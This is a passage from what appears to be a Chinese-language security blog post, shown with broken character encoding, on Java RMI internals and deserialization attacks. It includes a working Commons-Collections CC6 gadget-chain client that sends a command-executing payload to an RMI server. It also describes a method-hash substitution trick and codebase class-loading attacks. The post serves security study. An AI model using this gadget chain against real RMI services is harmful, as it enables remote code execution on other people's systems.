class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®¡ç†å™¨åº”ä¸ç®¡ç†ç­–ç•¥ç›¸è¾…ç›¸æˆï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æä¾›ä¸€ä¸ªç­–ç•¥æ–‡ä»¶ï¼Œé‡Œé¢é…ç½®å…è®¸é‚£äº›ä¸»æœºè¿›è¡Œå“ªäº›æ“ä½œï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œç›´æ¥è®¾ç½®å…¨éƒ¨æƒé™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥ä½¿ç”¨ <code>-Djava.security.policy=rmi.policy</code> æˆ– <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> æ¥è¿›è¡Œè®¾ç½®ã€‚</p><h2 id="RMIåº•å±‚åŸç†æ€»ç»“"><a href="#RMIåº•å±‚åŸç†æ€»ç»“" class="headerlink" title="RMIåº•å±‚åŸç†æ€»ç»“"></a>RMIåº•å±‚åŸç†æ€»ç»“</h2><p>å¯¹äºæ›´åº•å±‚éƒ¨åˆ†çš„åˆ†ææˆ‘å°±ä¸çŒ®ä¸‘ï¼Œç½‘ä¸Šå¾ˆå¤šå¤§ç‰›éƒ½å†™å¾—å¾ˆé€å½»æ¸…æ™°ï¼Œè¿™é‡Œæˆ‘å°±åªå†™å†™RMI-Attackè¡Œä¸ºäº†ã€‚</p><p>åº•å±‚åŸç†å¯ä»¥æ€»ç»“ä¸ºï¼ˆå€Ÿç”¨su18ä½¬çš„å›¾å›¾ï¼‰ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>æ€»è€Œè¨€ä¹‹ï¼ŒRMI åº•å±‚é€šè®¯é‡‡ç”¨äº†Stub (è¿è¡Œåœ¨å®¢æˆ·ç«¯) å’Œ Skeleton (è¿è¡Œåœ¨æœåŠ¡ç«¯) æœºåˆ¶ï¼ŒRMI è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€RMI å®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º Stub ( sun.rmi.registry.RegistryImpl_Stub )ã€‚<br><span class="hljs-number">2</span>ã€Stub ä¼šå°† Remote å¯¹è±¡ä¼ é€’ç»™è¿œç¨‹å¼•ç”¨å±‚ ( java.rmi.server.RemoteRef ) å¹¶åˆ›å»º java.rmi.server.RemoteCall( è¿œç¨‹è°ƒç”¨ )å¯¹è±¡ã€‚<br><span class="hljs-number">3</span>ã€RemoteCall åºåˆ—åŒ– RMI æœåŠ¡åç§°ã€Remote å¯¹è±¡ã€‚<br><span class="hljs-number">4</span>ã€RMI å®¢æˆ·ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ä¼ è¾“ RemoteCall åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡ Socket è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ° RMI æœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ã€‚<br><span class="hljs-number">5</span>ã€RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚( sun.rmi.server.UnicastServerRef )æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™ Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )ã€‚<br><span class="hljs-number">6</span>ã€Skeleton è°ƒç”¨ RemoteCall ååºåˆ—åŒ– RMI å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚<br><span class="hljs-number">7</span>ã€Skeleton å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼šbindã€listã€lookupã€rebindã€unbindï¼Œå¦‚æœæ˜¯ lookup åˆ™æŸ¥æ‰¾ RMI æœåŠ¡åç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡ RemoteCall ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">9</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚<br><span class="hljs-number">10</span>ã€RMI å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">11</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ– RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>è¿™é‡Œæˆ‘è§‰å¾—su18ä½¬çš„ç”µè¯æœ¬æ¯”å–»å¾ˆæ°å½“ä¹Ÿå¾ˆæ˜“æ‡‚ï¼ŒJava RMI è®¾è®¡äº†ä¸€ä¸ª Registry çš„æ€æƒ³ï¼Œå¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨æ¥æŸ¥æ‰¾ä¸€ä¸ªè¿œç«¯å¯¹è±¡çš„å¼•ç”¨ï¼Œæ›´é€šä¿—çš„æ¥è®²ï¼Œè¿™ä¸ªå°±æ˜¯ä¸€ä¸ª RMI ç”µè¯æœ¬ã€‚</p><p>æˆ‘ä»¬æƒ³åœ¨æŸä¸ªäººé‚£é‡Œè·å–ä¿¡æ¯æ—¶ï¼ˆRemote Method Invocationï¼‰ï¼Œæˆ‘ä»¬åœ¨ç”µè¯æœ¬ä¸Šï¼ˆRegistryï¼‰é€šè¿‡è¿™ä¸ªäººçš„åç§° ï¼ˆNameï¼‰æ¥æ‰¾åˆ°è¿™ä¸ªäººçš„ç”µè¯å·ç ï¼ˆReferenceï¼‰ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå·ç æ‰¾åˆ°è¿™ä¸ªäººï¼ˆRemote Objectï¼‰ã€‚</p><p>å‚ä¸ä¸€æ¬¡ RMI è°ƒç”¨çš„æœ‰ä¸‰ä¸ªè§’è‰²ï¼Œåˆ†åˆ«æ˜¯ Server ç«¯ï¼ŒRegistry ç«¯å’Œ Client ç«¯ã€‚ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è®²ï¼Œåªæœ‰ Registry ç«¯å’Œä½¿ç”¨ Registry çš„ç«¯ï¼Œå› ä¸º Registry ç«¯åªè´Ÿè´£æŸ¥è¯¢å’Œä¼ é€’å¼•ç”¨ï¼ŒçœŸæ­£çš„æ–¹æ³•è°ƒç”¨æ˜¯ä¸éœ€è¦ç»è¿‡ Registry ç«¯çš„ï¼Œåªä¸è¿‡æ³¨å†ŒæœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Server ç«¯ï¼Œä½¿ç”¨æœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Client ç«¯ã€‚</p><p><strong>æœ‰ä¸€ç§æˆ‘åªè´Ÿè´£å¸®ä½ æ‰¾åˆ°äººï¼Œè‡³äºä½ æ‰¾è¿™ä¸ªäººåšä»€ä¹ˆéæ³•å‹¾å½“æˆ‘ä¸ç®¡çš„æ„Ÿè§‰</strong>ï¼Œä¸è¿‡ä¸ºäº†æ›´æ¸…æ™°çš„åˆ’åˆ†ä¸åŒè§’è‰²ï¼Œæˆ‘ä»¬è¿˜æ˜¯å°†å…¶åˆ†ä¸ºä¸‰ä¸ªè§’è‰²ï¼Œè€Œé€šå¸¸æƒ…å†µä¸‹ï¼ŒServer ç«¯å’Œ Registry ç«¯æ˜¯åŒä¸€ç«¯ã€‚</p><p>RMIè°ƒç”¨è¿‡ç¨‹å†³å®šäº†ä¸‰è€…éƒ½æ¶‰åŠååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¯¹è¿™ä¸‰è€…çš„æ”»å‡»å°±å‘¼ä¹‹æ¬²å‡ºã€‚</p><p>å¤§æ¦‚åˆ†è¿™å‡ ç§ï¼š</p><ol><li>æ”»å‡»å®¢æˆ·ç«¯<ul><li>RegistryImp_Stub#lookup ååºåˆ—åŒ–æ³¨å†Œä¸­å¿ƒè¿”å›çš„Stub</li><li>UnicastRef#invoke ååºåˆ—åŒ–è¿œè°ƒæ–¹æ³•çš„æ‰§è¡Œç»“æœ</li><li>StreamRemoteCall#executeCall ååºåˆ—åŒ–è¿œç¨‹è°ƒç”¨è¿”å›çš„å¼‚å¸¸ç±»</li><li>DGCImpl_Stub#dirty</li></ul></li><li>æ”»å‡»æœåŠ¡ç«¯<ul><li>UnicastServerRef#dispatch ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ é€’çš„æ–¹æ³•å‚æ•°</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>æ”»å‡»æ³¨å†Œä¸­å¿ƒ<ul><li>RegistryImp_Stub#bind æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–æœåŠ¡ç«¯ä¼ é€’ä¼ æ¥çš„è¿œç¨‹å¯¹è±¡</li></ul></li></ol><h3 id="Server-ç«¯-Attack"><a href="#Server-ç«¯-Attack" class="headerlink" title="Server ç«¯ Attack"></a>Server ç«¯ Attack</h3><h4 id="æ¶æ„æœåŠ¡å‚æ•°"><a href="#æ¶æ„æœåŠ¡å‚æ•°" class="headerlink" title="æ¶æ„æœåŠ¡å‚æ•°"></a>æ¶æ„æœåŠ¡å‚æ•°</h4><p>è¿™é‡Œéœ€è¦ä¸€ä¸ªèƒŒæ™¯ï¼Œå½“ Client ç«¯è·å–åˆ° Server ç«¯åˆ›å»ºçš„ Stub åï¼ŒClient ä¼šåœ¨æœ¬åœ°è°ƒç”¨è¿™ä¸ª Stub å¹¶ä¼ é€’å‚æ•°ï¼ŒStub ä¼šåºåˆ—åŒ–è¿™ä¸ªå‚æ•°å¹¶ä¼ é€’ç»™ Server ç«¯ï¼Œ<strong>Server ç«¯å°±ä¼šååºåˆ—åŒ– Client ç«¯ä¼ å…¥çš„å‚æ•°å¹¶è¿›è¡Œè°ƒç”¨</strong>ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ <strong>Object ç±»å‹</strong>çš„æƒ…å†µä¸‹ï¼ŒClient ç«¯å¯ä»¥ä¼ ç»™ Server ç«¯<strong>ä»»æ„çš„ç±»</strong>ï¼Œç›´æ¥é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬ä¸Šé¢å†™çš„åœ¨è¿œç¨‹è°ƒç”¨æ¥å£ RemoteInterface å­˜åœ¨ä¸€ä¸ªä¼ å…¥Objectç±»å‹çš„<code>sayGoodbye</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥å¯ä»¥ä¼ ä¸€ä¸ªååºåˆ—åŒ– payload è¿›å»æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6ç›´æ¥å¼¹calcã€‚</p><p>å¦‚æœå‚æ•°ç±»å‹ä¸æ˜¯ Object ç±»å‹ï¼Œé‚£èƒ½å¦è¿›è¡Œæ”»å‡»ï¼Ÿ</p><p>å½“ç„¶å¯ä»¥ã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸ªå°å®éªŒï¼Œæˆ‘ä»¬åœ¨Serverçš„æ¥å£å¤„è‹¥ä½¿ç”¨<code>HelloObject</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼ŒClientçš„æ¥å£ä½¿ç”¨<code>Object</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼š</p><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·è‹¥æƒ³ç›´æ¥è§¦å‘ååºåˆ—åŒ–æ´ä¼šæŠ¥é”™ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>å…¶å®å¯ä»¥çœ‹å‡ºï¼Œå°±æ˜¯åœ¨æœåŠ¡ç«¯æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„è°ƒç”¨æ–¹æ³•ã€‚å¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨æ–¹æ³•åœ¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•ä¸­åœ¨ <code>this.hashToMethod_Map</code> ä¸­é€šè¿‡ Method çš„ hash æ¥æŸ¥æ‰¾ã€‚</p><p>è¿™ä¸ª hash å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŸºäºæ–¹æ³•ç­¾åçš„ SHA1 hash å€¼ã€‚</p><p>é‚£æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œ<strong>æˆ‘ä»¬ä¼ é€’çš„æ˜¯ Server ç«¯èƒ½æ‰¾åˆ°çš„å‚æ•°æ˜¯ HelloObject çš„ Method çš„ hashï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°å´ä¸æ˜¯ HelloObject è€Œæ˜¯æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼ˆå¯èƒ½æ˜¯ Objectæˆ–å…¶ä»–çš„ç±»ï¼‰å‘¢ï¼Ÿ</strong></p><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œåœ¨ mogwailabs çš„ [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) ä¸­æå‡ºäº†ä»¥ä¸‹ 4 ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ç½‘ç»œä»£ç†ï¼Œåœ¨æµé‡å±‚ä¿®æ”¹æ•°æ®</li><li>è‡ªå®šä¹‰ â€œjava.rmiâ€ åŒ…çš„ä»£ç ï¼Œè‡ªè¡Œå®ç°</li><li>å­—èŠ‚ç ä¿®æ”¹</li><li>ä½¿ç”¨ debugger</li></ul><p>å¹¶ä¸”åœ¨ PPT ä¸­è¿˜ç»™å‡ºäº† hook ç‚¹ï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç†ä¸­ä½¿ç”¨çš„ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•ã€‚</p><p>å®¢æˆ·ç«¯çš„æ¥å£ä¹Ÿæ·»åŠ ä¸€ä¸ªåŒæœåŠ¡ç«¯ç›¸åŒçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å³è°ƒè¯•ä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œåœ¨<code>RemoteObjectInvocationHandler</code>è°ƒç”¨<code>invokeRemoteMethod</code>çš„æ—¶å€™ä¿®æ”¹methodï¼ˆåœ¨ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•å¤„ä¸‹æ–­ï¼Œå°† Method æ”¹ä¸ºæœåŠ¡ç«¯å­˜åœ¨çš„ HelloObject çš„ Methodï¼‰ï¼Œä¸‹é¢<code>getMethodHash(method)</code>è·å–åˆ°çš„å“ˆå¸Œå°±å’ŒæœåŠ¡ç«¯çš„ä¸€æ ·äº†ï¼Œåç»­å¼¹calcéƒ½ä¸€æ ·çš„ã€‚</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 å¸ˆå‚…ä½¿ç”¨äº† Java Agent çš„æ–¹å¼æ’æ¡©ï¼Œåœ¨<a href="https://www.anquanke.com/post/id/200860">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œ0c0c0f å¸ˆå‚…ä½¿ç”¨äº†æµé‡å±‚çš„æ›¿æ¢ï¼Œåœ¨<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è¯·è‡ªè¡ŒæŸ¥çœ‹ã€‚</p><p>åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå°±å¤§å¤§çš„æ‰©å±•äº†åˆ©ç”¨é“¾ã€‚RMI çš„ååºåˆ—åŒ–é€»è¾‘ä½äº <code>sun.rmi.server.UnicastRef#unmarshalValue</code>ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†åŸºç¡€æ•°æ®ç±»å‹ï¼Œå…¶ä»–çš„ç±»å‹å‡èƒ½è°ƒç”¨ readObject è¿›è¡Œååºåˆ—åŒ–ï¼Œç”šè‡³åŸæœ¬ String ç±»å‹çš„å‚æ•°ä¹Ÿä¼šèµ° readObject ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç»“åˆä¹‹å‰çš„æ›¿æ¢æ‰‹æ®µï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼š</p><blockquote><p><strong>Server ç«¯çš„è°ƒç”¨æ–¹æ³•å­˜åœ¨éåŸºç¡€ç±»å‹çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥è¢«æ¶æ„ Client ç«¯ä¼ å…¥æ¶æ„æ•°æ®æµè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</strong></p></blockquote><h4 id="åŠ¨æ€ç±»åŠ è½½"><a href="#åŠ¨æ€ç±»åŠ è½½" class="headerlink" title="åŠ¨æ€ç±»åŠ è½½"></a>åŠ¨æ€ç±»åŠ è½½</h4><p>ä¸Šé¢è¯´è¿‡ï¼ŒRMIååºåˆ—åŒ–å‚æ•°çš„æ—¶å€™ï¼Œè‹¥åœ¨æœ¬åœ°æ‰¾ä¸åˆ°ç±»ï¼Œä¼šåœ¨æŒ‡å®šçš„codebaseä¸‹åŠ è½½ç±»ï¼Œè€Œcodebaseå¯ä»¥ç”±å®¢æˆ·ç«¯æŒ‡å®šï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„æ‰“ååºåˆ—åŒ–çš„åœ°æ–¹ã€‚è¿™ä¸ªç‰¹æ€§åœ¨ 6u45&#x2F;7u21 ä¹‹å‰éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿè¿œç¨‹åŠ è½½ç›®æ ‡ç±»ï¼Œéœ€è¦ Server åŠ è½½å¹¶é…ç½® SecurityManagerï¼Œå¹¶è®¾ç½® <code>java.rmi.server.useCodebaseOnly=false</code>ã€‚</p><p>Server ç«¯è°ƒç”¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè°ƒç”¨ <code>unmarshalParameters</code> æ–¹æ³•ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°ã€‚</p><p>ååºåˆ—åŒ–è¿‡ç¨‹ç”± RMI å°è£…ç±» MarshalInputStream æ¥å®ç°ï¼Œä¼šè°ƒç”¨ <code>resolveClass</code> æ¥è§£æ 